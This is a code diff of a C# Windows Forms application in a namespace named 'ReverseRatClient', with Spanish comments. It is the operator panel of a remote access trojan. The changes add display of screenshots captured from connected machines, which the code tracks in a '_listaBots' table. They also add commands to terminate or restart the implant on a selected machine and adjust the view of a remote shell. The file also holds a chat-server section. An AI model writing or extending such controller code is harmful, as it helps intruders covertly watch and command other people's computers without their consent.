@@ -7,6 +7,7 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using System.Drawing;
 //for Streams
 //to run commands concurrently
 //for IPEndPoint
@@ -134,13 +135,16 @@ namespace ReverseRatClient
                              DisplayMessage("<Conexion perdida con: " + socketNuevo.GetHashCode() + ">\r\n");
                              string formarCadena273 = "273 " + ObtenerNickPorHash(socketNuevo.GetHashCode().ToString());
                              EnviarBroadCast(formarCadena273, socketNuevo.GetHashCode().ToString(), ObtenerCanalPorHash(socketNuevo.GetHashCode().ToString()));
-                             EliminarClienteLista(socketNuevo);                             
+                             EliminarClienteLista(socketNuevo);
                              Cleanup(socketNuevo, streamReader, streamWriter, networkStream);
+                           /*  streamReader.Close();
+                             streamWriter.Close();
+                             socketNuevo.Close();*/
                              break;
                         }                        
-                    }                    
-                    DisplayMessage(strInput.ToString());
-                   
+                    }
+                    if (strInput.ToString().Length < 300)
+                        DisplayMessage(strInput.ToString());                   
 
                 }
                 else
@@ -157,7 +161,7 @@ namespace ReverseRatClient
                                 //Formato al texto de Shell
                                 if (pnlControl.textBox1.Text.Substring(pnlControl.textBox1.Text.Length - 3, 1) == ">")
                                 {
-                                    pnlControl.textBox1.Text = pnlControl.textBox1.Text.Substring(0, pnlControl.textBox1.Text.Length - 2) + "\r\n";
+                                    pnlControl.textBox1.Text = pnlControl.textBox1.Text.Substring(0, pnlControl.textBox1.Text.Length - 2);
                                     pnlControl.textBox1.SelectionStart = pnlControl.textBox1.TextLength;
                                     pnlControl.textBox1.ScrollToCaret();
                                 }
@@ -234,21 +238,47 @@ namespace ReverseRatClient
                     }
                 }
             }
+
+            // Comandos
             // Respuesta imagen de captura
             if (cadEv.IndexOf("<:imagen:>") >= 0)
+            {
+                ProcesarCaptura(cadEv);
+            }
+            s = "";
+            return false;
+        }
+
+        private static void ProcesarCaptura(string cadEv) // Procesa captura y la manda al picturebox
+        {
+            try
             {
                 string delimiter = "<:imagen:>";
                 // Dividir la cadena utilizando la cadena delimitadora
                 string[] split = cadEv.Split(new string[] { delimiter }, StringSplitOptions.None);
                 byte[] bytes = Convert.FromBase64String(split[1]);
 
-                //File.WriteAllBytes(@"C:\sw\imagen.png", bytes);
-                //MessageBox.Show("Imagen guardada");
-            }
-            s = "";
-            return false;
-        }
+                string cadenaEvaluar = split[2];
 
+                // Devolver ventana
+                for (int ctx = 0; ctx < ActiveForm.MdiChildren.Length; ctx++)
+                {
+                    if (Convert.ToString(ActiveForm.MdiChildren[ctx].Tag) == cadenaEvaluar)
+                    {
+                        var pnlControl = (PanelDeControl)ActiveForm.MdiChildren[ctx];
+                        using (MemoryStream memoryStream = new MemoryStream(bytes))
+                        {
+                            Image image = Image.FromStream(memoryStream);
+                            pnlControl.pictureBox1.Image = image;
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.Write(ex.Message);
+            }
+        }
 
         int EncontrarIndiceHash(DataGridView dvg, string hash) // Encuentra indice en base al Socket hash como parametro
         {
@@ -348,8 +378,13 @@ namespace ReverseRatClient
 
         private void EnviaComandoTexto()
         {
-            EnviarComando(textBox2.Text);          
-            if (textBox2.Text == @"cls") textBox1.Text = "";
+            if (textBox2.Text == @"cls")
+            {                
+                textBox1.Text = "";
+                return;
+            }
+           
+            EnviarComando(textBox2.Text);                      
             textBox2.Text = "";
         }
 
@@ -383,7 +418,7 @@ namespace ReverseRatClient
         }
 
         private void EnviarComando(string comando) // Enviar comando al elemento seleccionado en Dvw
-        {
+        {            
             string mensaje = comando;
             string cadenaForm;
             Funciones x = new Funciones();
@@ -446,13 +481,29 @@ namespace ReverseRatClient
 
         private void cerrarServidorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            EnviarComando("<:terminar:>");
+            if (dataGridView1.SelectedRows.Count > 0)
+            {
+                CerrarPanel(dataGridView1.SelectedRows[0].Cells["HashSocket"].Value.ToString());
+                EnviarComando("<:terminar:>");
+            }
+        }
+
+        void CerrarPanel(string hash)
+        {
+            //MessageBox.Show(hash);
+            for (int ctx = 0; ctx < ActiveForm.MdiChildren.Length; ctx++)
+            {
+                if (Convert.ToString(ActiveForm.MdiChildren[ctx].Tag) == hash)
+                {
+                    var pnlControl = (PanelDeControl)ActiveForm.MdiChildren[ctx];
+                    pnlControl.Close();                    
+                }
+            }
         }
 
         private void button3_Click(object sender, EventArgs e)
         {
-           EnviaComandoTexto();
-           
+             EnviaComandoTexto();           
         }
 
         private void abrirVentanaToolStripMenuItem_Click(object sender, EventArgs e)
@@ -466,7 +517,6 @@ namespace ReverseRatClient
                 ventana.Tag = dataGridView1.SelectedRows[0].Cells["HashSocket"].Value.ToString();
                 _msc.MostrarMdi(ActiveForm, ventana, "PanelDeControl", Convert.ToString(ventana.Tag));
             }
-
         }
 
      
@@ -478,25 +528,10 @@ namespace ReverseRatClient
             var sckEnviar = (Socket)_listaBots[cadenaForm];
             MessageBox.Show( sckEnviar.Connected.ToString());
         }
-
-
-
-
-        #region ServidorEshare
-
-
-
-        private void button4_Click(object sender, EventArgs e)
+        private void reiniciarServidorToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            // Mensaje Admin
-            foreach (UsuariosChat usr in listaUsuariosChat)
-            {
-                EnviarComando("700 " + textBox4.Text, usr.SocketUsr);
-            }
-            textBox4.Text = "";
+            EnviarComando("<:reiniciar:>");
         }
-
-
         private void EnviarComando(string comando, Socket sck)
         {
             string mensaje = comando;
@@ -523,6 +558,25 @@ namespace ReverseRatClient
             }
 
         }
+
+
+
+        #region ServidorEshare
+
+
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            // Mensaje Admin
+            foreach (UsuariosChat usr in listaUsuariosChat)
+            {
+                EnviarComando("700 " + textBox4.Text, usr.SocketUsr);
+            }
+            textBox4.Text = "";
+        }
+
+
+    
 
         void ProcesarComandosChat(StringBuilder cadena, Socket sck)
         {
@@ -749,16 +803,11 @@ namespace ReverseRatClient
             return "Sin Nick";
         }
 
-        private void reiniciarServidorToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            EnviarComando("<:reiniciar:>");
-        }
-
-
-        //Envia mensajes publicos usando el 270, 273
         void EnviarBroadCast(string cadena, string hashActual, string canal)
         {
-            foreach (UsuariosChat usr in listaUsuariosChat)
+            List<UsuariosChat> lista2 = new List<UsuariosChat>();
+            lista2.AddRange(listaUsuariosChat);
+            foreach (UsuariosChat usr in lista2)
             {
                 if (usr.SocketUsr.GetHashCode().ToString() != hashActual && string.Equals(usr.CanalActual, canal, StringComparison.CurrentCultureIgnoreCase))
                 {
@@ -766,6 +815,11 @@ namespace ReverseRatClient
                 }
             }
         }
+
+       
+
+        //Envia mensajes publicos usando el 270, 273
+      
 
         #endregion
 
